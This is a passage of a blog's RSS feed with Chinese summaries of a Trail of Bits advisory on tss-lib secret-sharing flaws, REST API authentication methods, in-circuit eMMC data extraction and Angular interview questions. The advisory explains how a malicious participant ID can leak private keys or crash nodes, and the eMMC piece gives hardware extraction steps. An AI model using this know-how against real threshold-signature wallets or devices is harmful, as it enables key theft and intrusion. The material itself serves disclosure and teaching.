&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Khaled Alenazi (Nxploited)&lt;/strong&gt;&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Nxploited&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub: Nxploited&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>揭秘Shamir秘密共享漏洞与ZKDocs发布</title>
        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ezkdocs%E5%8F%91%E5%B8%83/</link>
        <pubDate>Sat, 02 Aug 2025 00:55:39 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ezkdocs%E5%8F%91%E5%B8%83/</guid>
        <description>&lt;p&gt;Trail of Bits公开披露两个影响Binance阈值签名方案库(tss-lib)及其主要活跃分叉项目的漏洞。受影响代码库包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Binance的tss-lib&lt;/li&gt;
&lt;li&gt;Clover Network的threshold-crypto&lt;/li&gt;
&lt;li&gt;Keep Network的keep-ecdsa&lt;/li&gt;
&lt;li&gt;Swingby的tss-lib&lt;/li&gt;
&lt;li&gt;THORchain的tss-lib&lt;/li&gt;
&lt;li&gt;ZenGo X的curv&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;攻击者只需在密钥生成或重新共享协议启动时配置恶意ID，即可窃取其他用户的私钥或使其节点崩溃。&lt;/p&gt;
&lt;p&gt;阈值签名方案是强大的密码学工具，但需要零知识证明、承诺方案和可验证秘密共享等复杂非标准化原语。由于缺乏实施指南，实践中常出现类似我们披露的这两个漏洞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;阈值签名方案原理&lt;/strong&gt;&lt;br&gt;
阈值签名允许用户组共同控制签名私钥，与多重签名(multisig)的区别在于：多重签名每个用户持有独立密钥，而阈值签名中每个用户持有同一密钥的份额。阈值签名只需生成一个组签名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可验证秘密共享(VSS)&lt;/strong&gt;&lt;br&gt;
Shamir秘密共享通过生成t-1次随机多项式（常数项设为密钥值），在n个不同点求值创建份额。Feldman方案在此基础上增加了可验证性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞技术细节&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;零值泄露漏洞&lt;/strong&gt;：当多项式在x=0处求值时直接泄露常数项密钥。虽然多数实现通过检查ID非零来防护，但未对椭圆曲线群阶取模检查，导致设置ID为群阶q时仍会泄露密钥。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;模运算崩溃漏洞&lt;/strong&gt;：计算拉格朗日系数时，若IDi ≡ SelfID (mod q)，会导致模逆不存在。脆弱实现未验证模逆直接解引用空指针。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;ZKDocs发布&lt;/strong&gt;&lt;br&gt;
我们推出非标准化密码原语文档ZKDocs，包含秘密共享等协议的完整实现细节和安全考量。例如关于零值份额漏洞的详细分析可在ZKDocs的秘密共享章节查阅。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;时间线&lt;/strong&gt;&lt;br&gt;
2021.10.19 发现tss-lib数据泄露&lt;br&gt;
2021.12.06 向各厂商报告&lt;br&gt;
截至2021.12.20，除Clover外所有厂商均已修复&lt;/p&gt;
&lt;p&gt;Binance、Keep Network等团队已提交修复补丁。我们呼吁开发者：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;模运算前必须进行模约简&lt;/li&gt;
&lt;li&gt;始终验证模逆和模平方根操作&lt;/li&gt;
&lt;li&gt;必要时联系专业审计&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>REST API认证的5种基础策略及其演进方法</title>
        <link>http://localhost:1313/p/rest-api%E8%AE%A4%E8%AF%81%E7%9A%845%E7%A7%8D%E5%9F%BA%E7%A1%80%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E6%BC%94%E8%BF%9B%E6%96%B9%E6%B3%95/</link>
        <pubDate>Sat, 02 Aug 2025 00:39:08 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rest-api%E8%AE%A4%E8%AF%81%E7%9A%845%E7%A7%8D%E5%9F%BA%E7%A1%80%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E6%BC%94%E8%BF%9B%E6%96%B9%E6%B3%95/</guid>
        <description>&lt;h1 id=&#34;rest-api认证的5种基础策略&#34;&gt;REST API认证的5种基础策略
&lt;/h1&gt;&lt;p&gt;作为现代应用的支柱，REST API在实现数据层与表现层分离的同时，也需要通过认证机制保护敏感数据。以下是五种基础认证方法及其特点：&lt;/p&gt;
&lt;h2 id=&#34;基础认证basic-authentication&#34;&gt;基础认证（Basic Authentication）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;采用Base64编码格式在HTTP头中存储用户名密码&lt;/li&gt;
&lt;li&gt;优势：开发工具链广泛支持，实现轻量简单&lt;/li&gt;
&lt;li&gt;风险：凭证以明文传输，必须配合SSL/TLS通道使用&lt;/li&gt;
&lt;li&gt;局限：缺乏原生多因素认证支持&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;api密钥&#34;&gt;API密钥
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;通过机器生成的字符串创建凭证-令牌对&lt;/li&gt;
&lt;li&gt;部署方式：可嵌入载荷、HTTP头或查询字符串&lt;/li&gt;
&lt;li&gt;特点：支持凭证与访问令牌解耦，便于权限变更时撤销&lt;/li&gt;
&lt;li&gt;风险：与基础认证同样存在凭证拦截可能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;hmac加密&#34;&gt;HMAC加密
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;采用对称加密验证数据载荷完整性&lt;/li&gt;
&lt;li&gt;适用场景：客户端和服务端均由单方控制的场景&lt;/li&gt;
&lt;li&gt;挑战：移动端密钥存储安全问题，特别是URL嵌入密钥时&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oauth-20黄金标准&#34;&gt;OAuth 2.0（黄金标准）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;五大授权类型：
&lt;ol&gt;
&lt;li&gt;授权码模式&lt;/li&gt;
&lt;li&gt;PKCE扩展&lt;/li&gt;
&lt;li&gt;客户端凭证&lt;/li&gt;
&lt;li&gt;设备码&lt;/li&gt;
&lt;li&gt;刷新令牌&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;核心特性：
&lt;ul&gt;
&lt;li&gt;支持动态令牌刷新&lt;/li&gt;
&lt;li&gt;通过scope概念实现精细权限控制&lt;/li&gt;
&lt;li&gt;可结合JWT实现载荷完整性检查&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;openid-connect&#34;&gt;OpenID Connect
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;基于OAuth 2.0的开源认证协议&lt;/li&gt;
&lt;li&gt;三大授权类型：
&lt;ol&gt;
&lt;li&gt;授权码模式&lt;/li&gt;
&lt;li&gt;隐式模式&lt;/li&gt;
&lt;li&gt;混合模式&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;特点：简化第三方应用的用户身份验证&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;新兴认证方案&#34;&gt;新兴认证方案
&lt;/h1&gt;&lt;h2 id=&#34;令牌认证otp魔法链接&#34;&gt;令牌认证（OTP/魔法链接）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;OTP&lt;/strong&gt;：基于TOTP/HOTP算法生成临时密码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;魔法链接&lt;/strong&gt;：含时效性验证码的URL&lt;/li&gt;
&lt;li&gt;优势：无需记忆密码&lt;/li&gt;
&lt;li&gt;风险：依赖传输通道安全性&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;通行密钥passkeys&#34;&gt;通行密钥（Passkeys）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;基于WebAuthn标准的无密码方案&lt;/li&gt;
&lt;li&gt;双重验证机制：
&lt;ol&gt;
&lt;li&gt;设备本地认证（生物识别/PIN）&lt;/li&gt;
&lt;li&gt;公私钥加密挑战&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;特点：抗钓鱼攻击，但存在设备依赖风险&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;方案选型建议&#34;&gt;方案选型建议
&lt;/h1&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方案&lt;/th&gt;
          &lt;th&gt;适用场景&lt;/th&gt;
          &lt;th&gt;注意事项&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;基础认证&lt;/td&gt;
          &lt;td&gt;低风险数据的访问控制&lt;/td&gt;
          &lt;td&gt;必须启用SSL/TLS&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;API密钥&lt;/td&gt;
          &lt;td&gt;需识别消费方的场景&lt;/td&gt;
          &lt;td&gt;避免URL嵌入凭证&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;HMAC&lt;/td&gt;
          &lt;td&gt;数据完整性要求高的封闭系统&lt;/td&gt;
          &lt;td&gt;注意密钥存储安全&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;OAuth 2.0&lt;/td&gt;
          &lt;td&gt;企业级复杂应用&lt;/td&gt;
          &lt;td&gt;妥善管理对称密钥分发&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;OpenID Connect&lt;/td&gt;
          &lt;td&gt;需平衡安全与简易性的第三方集成&lt;/td&gt;
          &lt;td&gt;控制RP权限范围&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;最佳实践：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;始终通过SSL/TLS通道暴露API&lt;/li&gt;
&lt;li&gt;避免在URL/查询字符串中传输敏感凭证&lt;/li&gt;
&lt;li&gt;采用强化的密钥管理系统&lt;/li&gt;
&lt;li&gt;实现自动化密钥轮换机制&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>系统内提取嵌入式多媒体卡(eMMC)内容的技术指南</title>
        <link>http://localhost:1313/p/%E7%B3%BB%E7%BB%9F%E5%86%85%E6%8F%90%E5%8F%96%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%A4%9A%E5%AA%92%E4%BD%93%E5%8D%A1emmc%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 00:02:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%B3%BB%E7%BB%9F%E5%86%85%E6%8F%90%E5%8F%96%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%A4%9A%E5%AA%92%E4%BD%93%E5%8D%A1emmc%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;系统内提取嵌入式多媒体卡emmc内容&#34;&gt;系统内提取嵌入式多媒体卡(eMMC)内容
&lt;/h1&gt;&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;现代复杂设备需要非易失性存储来保存断电时的程序和配置数据。当前市场主流方案包括串行Flash、原始NAND芯片、(micro)SD卡和嵌入式多媒体卡(eMMC)。本文重点探讨eMMC芯片的系统内交互技术，避免物理移除芯片带来的风险。&lt;/p&gt;
&lt;h2 id=&#34;技术挑战与解决方案&#34;&gt;技术挑战与解决方案
&lt;/h2&gt;&lt;h3 id=&#34;问题1定位电路板上的emmc信号&#34;&gt;问题1：定位电路板上的eMMC信号
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;信号特征&lt;/strong&gt;：CLK(主机提供时钟)、CMD(双向命令线)、DAT0-DAT7(双向数据线)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定位方法&lt;/strong&gt;：
&lt;ol&gt;
&lt;li&gt;检查PCB丝印标记&lt;/li&gt;
&lt;li&gt;追踪芯片周围走线&lt;/li&gt;
&lt;li&gt;使用逻辑分析仪捕捉上电时的信号特征&lt;/li&gt;
&lt;li&gt;协议分析确认有效信号&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;问题2emmc芯片供电方案&#34;&gt;问题2：eMMC芯片供电方案
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;供电选择&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;利用设备原有供电系统（需处理看门狗电路等问题）&lt;/li&gt;
&lt;li&gt;外部独立供电（需电流限制保护）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;电压要求&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;VDDQ决定总线信号电平（常见1.8V/3.3V）&lt;/li&gt;
&lt;li&gt;需使用双向电平转换器（推荐TI TXS系列）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;问题3系统隔离技术&#34;&gt;问题3：系统隔离技术
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;抑制系统活动方法&lt;/strong&gt;：
&lt;ol&gt;
&lt;li&gt;仅对eMMC独立供电&lt;/li&gt;
&lt;li&gt;强制断言SoC复位信号&lt;/li&gt;
&lt;li&gt;禁用主引导设备&lt;/li&gt;
&lt;li&gt;干扰时钟源（如移除晶体振荡器）&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实施注意事项&#34;&gt;实施注意事项
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;信号完整性：保持接线最短&lt;/li&gt;
&lt;li&gt;分区访问限制：常规接口可能无法访问boot/RPMB分区&lt;/li&gt;
&lt;li&gt;后期分析：通过用户区获取系统访问权限后扩展研究&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;延伸阅读&#34;&gt;延伸阅读
&lt;/h2&gt;&lt;p&gt;建议进一步研究侵入式技术方案。可通过Mastodon(@InfoSecDJ)联系作者获取更多技术细节。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Angular面试必备：15个常见问题与解答</title>
        <link>http://localhost:1313/p/angular%E9%9D%A2%E8%AF%95%E5%BF%85%E5%A4%8715%E4%B8%AA%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E7%AD%94/</link>
        <pubDate>Fri, 01 Aug 2025 23:37:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/angular%E9%9D%A2%E8%AF%95%E5%BF%85%E5%A4%8715%E4%B8%AA%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E7%AD%94/</guid>
        <description>&lt;h1 id=&#34;top-15-angular面试问题与答案&#34;&gt;Top 15 Angular面试问题与答案
&lt;/h1&gt;&lt;p&gt;现代软件开发行业需要精通各种流行框架（特别是JavaScript）的技能型开发者。在所有流行的JavaScript框架中，Angular是当前市场上最受欢迎的平台之一。&lt;/p&gt;
&lt;p&gt;Angular体系庞大且难以全面掌握，因此基于该框架的面试问题可能颇具挑战性。本文将引导你了解基础到高级的Angular面试问题，助你备战Angular开发岗位。&lt;/p&gt;
&lt;h2 id=&#34;q-1-什么是angular&#34;&gt;Q-1. 什么是Angular？
&lt;/h2&gt;&lt;p&gt;Angular是由Google于2016年创建的开源免费JavaScript框架，通过HTML、CSS和JavaScript等技术帮助构建现代Web和移动应用。其核心编程语言是TypeScript，作为开源前端框架特别适合创建企业级应用，支持代码重用且易于维护。&lt;/p&gt;
&lt;h2 id=&#34;q-2-angular使用了哪些技术&#34;&gt;Q-2. Angular使用了哪些技术？
&lt;/h2&gt;&lt;p&gt;作为开发者首选的JavaScript框架，Angular通过多种技术实现特定功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用TypeScript（JavaScript的超集）&lt;/li&gt;
&lt;li&gt;基于组件化架构&lt;/li&gt;
&lt;li&gt;采用依赖注入设计模式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-3-angular有哪些优势&#34;&gt;Q-3. Angular有哪些优势？
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;MVC架构&lt;/strong&gt;：模型管理数据，视图处理展示，控制器作为桥梁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;依赖注入&lt;/strong&gt;：简化开发流程，实现任务分治&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;双向数据绑定&lt;/strong&gt;：自动同步模型与视图，减少开发时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自定义指令&lt;/strong&gt;：通过DOM属性改变元素行为&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RESTful服务支持&lt;/strong&gt;：通过ngResource模块创建可扩展API&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码生成&lt;/strong&gt;：工具自动生成元数据和可用代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;验证支持&lt;/strong&gt;：自动运行验证并显示错误&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模板支持&lt;/strong&gt;：支持静态模板和Angular模板&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CLI工具&lt;/strong&gt;：通过命令行初始化和管理应用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动画等高级功能&lt;/strong&gt;：简化复杂动画实现&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;q-4-angular的主要特性是什么&#34;&gt;Q-4. Angular的主要特性是什么？
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;跨平台开发&lt;/strong&gt;：支持Windows/Mac/Linux桌面应用和移动开发&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码分割&lt;/strong&gt;：通过懒加载优化性能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动画支持&lt;/strong&gt;：基于Web动画API实现复杂效果&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CLI工具&lt;/strong&gt;：自动化项目搭建和配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;声明式UI&lt;/strong&gt;：使用HTML定义界面降低复杂度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无障碍支持&lt;/strong&gt;：遵循ARIA标准&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Material组件&lt;/strong&gt;：提供现成的UI组件库&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;差异化加载&lt;/strong&gt;：根据浏览器版本发送不同代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高性能&lt;/strong&gt;：懒加载机制提升运行效率&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-5-angular的核心基础是什么&#34;&gt;Q-5. Angular的核心基础是什么？
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;组件&lt;/strong&gt;：UI构建的基本单元&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Angular元素&lt;/strong&gt;：符合Web Components标准的组件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;指令&lt;/strong&gt;：扩展HTML元素行为的类&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;原生移动支持&lt;/strong&gt;：通过Ionic等方案实现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模块&lt;/strong&gt;：应用的逻辑组织单元(NgModules)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;依赖注入&lt;/strong&gt;：提升灵活性和模块化&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模板&lt;/strong&gt;：定义组件渲染方式的HTML&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;路由&lt;/strong&gt;：实现视图导航&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据绑定&lt;/strong&gt;：组件间数据共享机制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务&lt;/strong&gt;：可复用的业务逻辑单元&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-6-什么是数据绑定&#34;&gt;Q-6. 什么是数据绑定？
&lt;/h2&gt;&lt;p&gt;数据绑定建立应用UI与业务数据的连接，包含四种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;双向数据绑定&lt;/li&gt;
&lt;li&gt;字符串插值&lt;/li&gt;
&lt;li&gt;属性绑定&lt;/li&gt;
&lt;li&gt;事件绑定&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-7-什么是dom&#34;&gt;Q-7. 什么是DOM？
&lt;/h2&gt;&lt;p&gt;文档对象模型(DOM)以树形结构表示页面内容，Angular指令可将应用数据绑定到DOM元素属性。&lt;/p&gt;
&lt;h2 id=&#34;q-8-angular与angularjs的区别&#34;&gt;Q-8. Angular与AngularJS的区别？
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;参数&lt;/th&gt;
          &lt;th&gt;Angular&lt;/th&gt;
          &lt;th&gt;AngularJS&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;架构&lt;/td&gt;
          &lt;td&gt;指令/组件&lt;/td&gt;
          &lt;td&gt;MVC&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;支持&lt;/td&gt;
          &lt;td&gt;持续更新&lt;/td&gt;
          &lt;td&gt;停止维护&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;速度&lt;/td&gt;
          &lt;td&gt;更快&lt;/td&gt;
          &lt;td&gt;较慢&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;移动支持&lt;/td&gt;
          &lt;td&gt;支持&lt;/td&gt;
          &lt;td&gt;不支持&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;语言&lt;/td&gt;
          &lt;td&gt;TypeScript&lt;/td&gt;
          &lt;td&gt;JavaScript&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;q-9-解释mvvm架构&#34;&gt;Q-9. 解释MVVM架构
&lt;/h2&gt;&lt;p&gt;包含三个部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Model&lt;/strong&gt;：业务逻辑和数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;View&lt;/strong&gt;：用户界面层&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ViewModel&lt;/strong&gt;：连接View和Model的抽象层&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-10-什么是指令&#34;&gt;Q-10. 什么是指令？
&lt;/h2&gt;&lt;p&gt;指令是通过属性扩展HTML行为的特性，分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结构指令&lt;/li&gt;
&lt;li&gt;属性指令&lt;/li&gt;
&lt;li&gt;组件指令&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-11-什么是angular-cli&#34;&gt;Q-11. 什么是Angular CLI？
&lt;/h2&gt;&lt;p&gt;命令行工具支持：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目初始化&lt;/li&gt;
&lt;li&gt;组件生成&lt;/li&gt;
&lt;li&gt;测试执行&lt;/li&gt;
&lt;li&gt;依赖管理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-12-解释依赖注入&#34;&gt;Q-12. 解释依赖注入
&lt;/h2&gt;&lt;p&gt;设计模式特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类从外部获取依赖而非自行创建&lt;/li&gt;
&lt;li&gt;提高灵活性和模块化&lt;/li&gt;
&lt;li&gt;注入器负责解析和提供依赖&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-13-认证与授权如何实现&#34;&gt;Q-13. 认证与授权如何实现？
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;认证：验证用户凭证获取访问令牌&lt;/li&gt;
&lt;li&gt;授权：基于令牌控制资源访问&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;q-14-什么是http拦截器&#34;&gt;Q-14. 什么是HTTP拦截器？
&lt;/h2&gt;&lt;p&gt;示例代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-typescript&#34; data-lang=&#34;typescript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;@Injectable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;TokenInterceptor&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;HttpInterceptor&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;intercept&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;: &lt;span class=&#34;kt&#34;&gt;HttpRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;any&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;: &lt;span class=&#34;kt&#34;&gt;HttpHandler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;authToken&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;localStorage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getItem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;authToken&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;authToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
